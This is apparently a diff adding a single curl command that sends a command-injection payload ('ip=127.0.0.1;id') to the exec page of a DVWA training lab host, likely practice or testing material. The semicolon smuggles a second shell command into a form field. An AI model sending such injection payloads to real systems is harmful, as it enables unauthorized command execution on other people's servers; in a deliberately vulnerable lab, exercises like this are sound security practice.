@@ -1,0 +1,3 @@
+curl -i --max-time 15 \
+  --data 'ip=127.0.0.1;id&Submit=Submit' \
+  http://dvwa.kt66.lab/vulnerabilities/exec/
